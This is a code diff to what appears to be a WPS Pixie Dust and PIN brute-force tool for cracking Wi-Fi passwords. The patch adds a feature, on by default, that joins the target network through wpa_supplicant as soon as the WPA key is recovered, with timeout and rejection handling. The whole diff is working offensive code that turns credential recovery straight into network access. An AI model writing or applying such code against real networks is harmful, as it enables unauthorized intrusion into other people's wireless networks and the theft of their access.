@@ -403,10 +403,11 @@ class BruteforceStatus:
 
 class Companion:
     """Main application part"""
-    def __init__(self, interface, save_result=False, print_debug=False):
+    def __init__(self, interface, save_result=False, print_debug=False, auto_connect=True):
         self.interface = interface
         self.save_result = save_result
         self.print_debug = print_debug
+        self.auto_connect_enabled = auto_connect
 
         self.tempdir = tempfile.mkdtemp()
         with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
@@ -608,6 +609,69 @@ class Companion:
             csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
         print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')
 
+    def auto_connect(self, essid=None, bssid=None):
+        """
+        Automatically connect to the network using the recovered PSK.
+        Adds a network via the wpa_supplicant control interface and associates.
+        """
+        psk = self.connection_status.wpa_psk
+        essid = essid or self.connection_status.essid
+        if not psk:
+            print('[-] No PSK available — cannot connect')
+            return False
+        if not essid and not bssid:
+            print('[-] Neither ESSID nor BSSID known — cannot connect')
+            return False
+
+        print('[*] Attempting auto-connect to {}…'.format(essid or bssid))
+        net_id = self.sendAndReceive('ADD_NETWORK').strip()
+        if not net_id.isdigit():
+            print('[-] ADD_NETWORK failed: {}'.format(net_id))
+            return False
+
+        def set_param(key, value):
+            return 'OK' in self.sendAndReceive('SET_NETWORK {} {} {}'.format(net_id, key, value))
+
+        if essid:
+            escaped = essid.replace('\\', '\\\\').replace('"', '\\"')
+            if not set_param('ssid', '"{}"'.format(escaped)):
+                print('[-] Failed to set SSID')
+                return False
+        else:
+            if not set_param('bssid', bssid):
+                print('[-] Failed to set BSSID')
+                return False
+        if not set_param('psk', '"{}"'.format(psk)):
+            print('[-] Failed to set PSK')
+            return False
+        if not set_param('key_mgmt', 'WPA-PSK'):
+            print('[-] Failed to set key_mgmt')
+            return False
+
+        self.sendOnly('SELECT_NETWORK {}'.format(net_id))
+        self.sendOnly('REASSOCIATE')
+
+        # Wait for the connection result (up to 30s)
+        deadline = time.time() + 30
+        while time.time() < deadline:
+            line = self.wpas.stdout.readline()
+            if not line:
+                break
+            line = line.rstrip('\n')
+            if self.print_debug:
+                sys.stderr.write(line + '\n')
+            if 'CTRL-EVENT-CONNECTED' in line:
+                print('[+] Successfully connected to {} (network id {})'.format(essid or bssid, net_id))
+                ret = self.sendAndReceive('SAVE_CONFIG')
+                if 'OK' in ret:
+                    print('[i] Network saved to {}'.format(self.tempconf))
+                return True
+            if 'CTRL-EVENT-DISCONNECTED' in line and 'reason=3' in line:
+                print('[-] Association rejected — PSK may be wrong or AP lockout still active')
+                return False
+        print('[-] Could not connect within 30 seconds')
+        return False
+
     def __savePin(self, bssid, pin):
         filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
         with open(filename, 'w') as file:
@@ -715,6 +779,8 @@ class Companion:
             self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
             if self.save_result:
                 self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
+            if self.auto_connect_enabled:
+                self.auto_connect(bssid=bssid)
             if not pbc_mode:
                 # Try to remove temporary PIN file
                 filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
@@ -1145,6 +1211,11 @@ if __name__ == '__main__':
         help='Write credentials to the file on success'
         )
     parser.add_argument(
+        '--no-auto-connect',
+        action='store_true',
+        help='Do not automatically connect to the target network after recovering the PSK (auto-connect is enabled by default)'
+        )
+    parser.add_argument(
         '--iface-down',
         action='store_true',
         help='Down network interface when the work is finished'
@@ -1198,7 +1269,8 @@ if __name__ == '__main__':
 
     while True:
         try:
-            companion = Companion(args.interface, args.write, print_debug=args.verbose)
+            companion = Companion(args.interface, args.write, print_debug=args.verbose,
+                                  auto_connect=not args.no_auto_connect)
             if args.pbc:
                 companion.single_connection(pbc_mode=True)
             else:
@@ -1214,7 +1286,8 @@ if __name__ == '__main__':
                     args.bssid = scanner.prompt_network()
 
                 if args.bssid:
-                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
+                    companion = Companion(args.interface, args.write, print_debug=args.verbose,
+                                          auto_connect=not args.no_auto_connect)
                     if args.bruteforce:
                         companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                     else:
